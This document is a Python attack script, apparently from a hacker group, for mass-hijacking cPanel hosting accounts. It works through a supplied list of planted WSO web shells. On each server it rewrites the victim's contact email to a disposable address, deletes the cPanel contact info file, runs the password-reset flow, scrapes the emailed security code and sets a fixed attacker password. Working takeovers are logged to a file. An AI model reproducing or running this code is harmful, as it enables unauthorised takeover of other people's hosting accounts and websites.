#!/usr/bin/env python3
## Wibu Heker
## https://web.facebook.com/wibuheker/
## Cpanel Mass Reset Password
import requests, re, argparse, json, time, warnings
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

class WibuHeker(object):

    def __init__(self, url):
        self.url = url
        wibu = self.url.split('/')
        self.parsed_url = "https://" + wibu[2] + ":2083"
        self.emails = None
        self.code = None
        self.user = None
        self.password = "wibuheker1337#$"
        self.GenerateEmail()
    def save(self, filename, content):
        f = open(filename, 'a+')
        f.write(content + "\n")
        f.close()
    def isCpanel(self):
        try:
            req = requests.get(self.parsed_url, verify=False)
            if '<a href="https://go.cpanel.net/privacy' in req.text:
                return True
            return False
        except Exception as e:
            return False
    
    def isRespass(self):
        try:
            req = requests.get(self.parsed_url, verify=False)
            if '<a href="/resetpass?start=1"' in req.text:
                return True
            return False
        except Exception as e:
            return False

    def GenerateEmail(self):
        try:
            req = requests.get('https://api.namefake.com/', verify=False)
            js = json.loads(req.text)
            self.emails = {
                'name': js['username'],
                'domain': 'rhyta.com'
            }
            return True
        except:
            return False

    def getCode(self):
        try:
            req = requests.get('http://www.fakemailgenerator.com/inbox/' + self.emails['domain'] + '/' + self.emails['name'])
            if 'cPanel' in req.text:
                code_url = re.findall(r'<iframe id="emailFrame" .* src=\"(.*?)\"><\/iframe>', req.text)[0]
                njir = requests.get(code_url, verify=False)
                code = re.findall(r'<p style=.*">([0-9]+)<\/p>', njir.text)[0]
                self.code = code
                return True
            return False
        except:
            return False
    def isContactExist(self):
        try:
            data = {
                "a": "FilesMan",
                "c": "/home/" + self.user + "/.cpanel",
                "p1": '',
                "p2": '',
                "p3": '',
                "charset": "Windows-1251"
            }
            req = requests.post(self.url, data=data, verify=False)
            if 'contactinfo' in req.text:
                return True
            return False
        except:
            return False

    def editEmail(self):
        try:
            req = requests.get(self.url, verify=False)
            if 'WebShellOrb' in req.text:
                user = re.findall('var c_ = \'/home/(.*?)/public', req.text)[0]
                data = {
                    "a": "FilesTools",
                    "c": "/home/" + user + "/",
                    "p1": ".contactemail",
                    "p2": "edit",
                    "p3": "1" + self.emails['name'] + "@" + self.emails['domain'],
                    "charset": "Windows-1251"
                }
                reqs = requests.post(self.url, data=data, verify=False)
                if 'Saved!' in reqs.text:
                    self.user = user
                    if self.isContactExist():
                        datas = {
                            "f[]": 'contactinfo',
                            "a": 'FilesMan',
                            "c": '/home/' + user + '/.cpanel/',
                            "charset": 'Windows-1251',
                            "p1": 'delete'
                        }
                        requests.post(self.url, data=datas, verify=False)
                    return True
                return False
            else:
                return False
        except:
            return False
    
    def doReset(self):
        session = requests.Session()
        session.get(self.parsed_url + "/resetpass?start=1", verify=False)
        data = {
            'user': self.user,
            'login': 'Reset Password'
        }
        req = session.post(self.parsed_url + "/resetpass", data=data, verify=False)
        if '<form id="reset_form" name="reset_form"' in req.text:
            data = {
                'action': 'puzzle',
                'user': self.user,
                'answer': self.emails['name'] + "@" + self.emails['domain'],
                'debug': '',
                'puzzle-guess-input': self.emails['name'] + "@" + self.emails['domain'],
                'login': 'Send Security Code'
            }
            req = session.post(self.parsed_url + "/resetpass", data=data, verify=False)
            if '<a id="btnResend"' in req.text:
                print('Sleep for 15 second for got code ...')
                time.sleep(15)
                if self.getCode():
                    data = {
                        'user': self.user,
                        'action': 'seccode',
                        'debug': '',
                        'confirm': self.code
                    }
                    req = session.post(self.parsed_url + "/resetpass", data=data, verify=False)
                    if '<div class="input-field-login icon password-confirm-container">' in req.text:
                        data = {
                            'action': 'password',
                            'user': self.user,
                            'debug': '',
                            'password': self.password,
                            'alpha': 'both',
                            'nonalpha': 'both',
                            'confirm': self.password
                        }
                        req = session.post(self.parsed_url + "/resetpass", data=data, verify=False)
                        if '<p id="cpanel-services">' in req.text:
                            print('SUCCESS RESET PASSWORD')
                            print('URL: ' + self.parsed_url)
                            print('USER: ' + self.user)
                            print('PASS: ' + self.password)
                            self.save('CPANEL_SUCCESS.txt', '%s|%s|%s' % (self.parsed_url, self.user, self.password))
                        else:
                            self.save('CPANEL_MANUAL.txt', '%s | %s | %s' % (self.parsed_url, self.emails['name'] + "@" + self.emails['domain'], 'http://www.fakemailgenerator.com/inbox/' + self.emails['domain'] + '/' + self.emails['name']))
                            print(self.parsed_url + " Failed To Change Password! Try Manual EMAIL: %s TEMPMAIL: %s" % (self.emails['name'] + "@" + self.emails['domain'], 'http://www.fakemailgenerator.com/inbox/' + self.emails['domain'] + '/' + self.emails['name']))
                    else:
                        self.save('CPANEL_MANUAL.txt', '%s | %s | %s' % (self.parsed_url, self.emails['name'] + "@" + self.emails['domain'], 'http://www.fakemailgenerator.com/inbox/' + self.emails['domain'] + '/' + self.emails['name']))
                        print(self.parsed_url + " Failed To Change Password! Try Manual EMAIL: %s TEMPMAIL: %s" % (self.emails['name'] + "@" + self.emails['domain'], 'http://www.fakemailgenerator.com/inbox/' + self.emails['domain'] + '/' + self.emails['name']))
                else:
                    self.save('CPANEL_MANUAL.txt', '%s | %s | %s' % (self.parsed_url, self.emails['name'] + "@" + self.emails['domain'], 'http://www.fakemailgenerator.com/inbox/' + self.emails['domain'] + '/' + self.emails['name']))
                    print(self.parsed_url + ' Code Not FOUND :(, maybe email delay, Reset by ur self this link for mail http://www.fakemailgenerator.com/inbox/' + self.emails['domain'] + '/' + self.emails['name'])
        else:
            print(self.parsed_url + ' Failed To Change Password! Try Manual EMAIL: %s TEMPMAIL: %s' % (self.emails['name'] + "@" + self.emails['domain'], 'http://www.fakemailgenerator.com/inbox/' + self.emails['domain'] + '/' + self.emails['name']))

parser = argparse.ArgumentParser(description='Cpanel Mass Reset By Wibu Heker')
parser.add_argument('--list', help='List Of Shell WSO Only', required=True)
parser.add_argument('--mode', help='Mode Scan / Reset', required=True)
args = parser.parse_args()
try:
    lists = open(args.list, 'r').read().splitlines()
    if args.mode == 'Scan':
        for site in lists:
            do = WibuHeker(site)
            if do.isCpanel():
                if do.isRespass():
                    print(do.parsed_url + " RESET PASSWORD ENABLE!")
                    do.save('CPANEL_RESET_ENABLE.txt', do.parsed_url)
                else:
                    print(do.parsed_url + " RESET PASSWORD DISABLE!")
            else:
                print(do.parsed_url + ' Is not CPANEL!')
    elif args.mode == 'Reset':
        for site in lists:
            do = WibuHeker(site)
            if do.isCpanel():
                if do.isRespass():
                    do.doReset()
                else:
                    print(do.parsed_url + " RESET PASSWORD DISABLE!")
            else:
                print(do.parsed_url + ' Is not CPANEL!')
except Exception as e:
    print(str(e))
